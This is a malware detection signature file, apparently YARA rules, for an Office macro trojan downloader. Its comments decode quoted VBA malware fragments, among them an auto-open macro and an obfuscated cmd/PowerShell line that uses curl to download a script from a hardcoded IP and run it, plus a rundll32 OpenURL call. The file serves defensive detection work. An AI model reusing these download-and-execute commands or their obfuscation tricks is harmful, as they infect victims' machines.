
rule TrojanDownloader_O97M_EncDoc_STJ_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.STJ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 "
		
	strings :
		$a_01_0 = {2e 4c 61 6e 67 75 61 67 65 20 3d 20 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 42 75 69 6c 74 69 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 43 61 74 65 67 6f 72 79 22 29 2e 56 61 6c 75 65 } //1 .Language = ActiveWorkbook.BuiltinDocumentProperties("Category").Value
		$a_03_1 = {2e 41 64 64 43 6f 64 65 20 28 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 42 75 69 6c 74 69 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 54 69 74 6c 65 22 29 2e 56 61 6c 75 65 29 90 02 0a 45 6e 64 20 57 69 74 68 90 02 03 45 6e 64 20 46 75 6e 63 74 69 6f 6e 90 00 } //1
		$a_03_2 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 22 90 02 03 46 75 6e 63 74 69 6f 6e 20 41 75 74 6f 5f 4f 70 65 6e 28 29 90 00 } //1
	condition:
		((#a_01_0  & 1)*1+(#a_03_1  & 1)*1+(#a_03_2  & 1)*1) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_STJ_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.STJ!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,04 00 04 00 04 00 00 "
		
	strings :
		$a_01_0 = {22 6c 69 63 5c 73 6b 65 6d 6c 2e 6c 22 20 26 20 4c 65 66 74 28 72 6f 63 6b 62 6f 74 74 6f 6d 2c 20 31 29 20 26 20 52 69 67 68 74 28 4c 65 66 74 28 72 6f 63 6b 62 6f 74 74 6f 6d 2c 20 34 29 2c 20 31 29 } //1 "lic\skeml.l" & Left(rockbottom, 1) & Right(Left(rockbottom, 4), 1)
		$a_01_1 = {66 63 73 30 39 62 31 6c 20 26 20 22 6c 69 63 5c 77 65 62 6e 6f 74 65 2e 6a 73 22 } //1 fcs09b1l & "lic\webnote.js"
		$a_01_2 = {67 6f 64 6b 6e 6f 77 73 20 3d 20 52 65 70 6c 61 63 65 28 22 63 6d 64 20 2f 63 20 70 6f 77 5e 66 63 73 30 39 62 31 6c 72 73 5e 68 66 63 73 30 39 62 31 6c 6c 6c 2f 57 20 30 31 20 63 5e 75 5e 72 6c 20 68 74 74 5e 70 3a 2f 2f 32 30 39 2e 31 32 37 2e 32 30 2e 31 33 2f 77 6f 6b 66 63 73 30 39 62 31 6c 2e 6a 5e 73 20 2d 6f 20 22 20 26 20 78 36 69 79 20 26 20 22 3b 22 20 26 20 78 36 69 79 2c 20 22 66 63 73 30 39 62 31 6c 22 2c 20 22 65 22 29 } //1 godknows = Replace("cmd /c pow^fcs09b1lrs^hfcs09b1lll/W 01 c^u^rl htt^p://209.127.20.13/wokfcs09b1l.j^s -o " & x6iy & ";" & x6iy, "fcs09b1l", "e")
		$a_01_3 = {52 65 70 6c 61 63 65 28 22 72 75 6e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 33 32 20 75 72 7a 5f 61 5f 64 5f 66 2e 64 7a 5f 61 5f 64 5f 66 7a 5f 61 5f 64 5f 66 2c 4f 70 65 6e 55 52 4c 20 22 20 26 20 61 6b 63 6a 33 32 76 33 30 64 75 2c 20 22 7a 5f 61 5f 64 5f 66 22 2c 20 22 6c 22 29 } //1 Replace("rundz_a_d_fz_a_d_f32 urz_a_d_f.dz_a_d_fz_a_d_f,OpenURL " & akcj32v30du, "z_a_d_f", "l")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1) >=4
 
}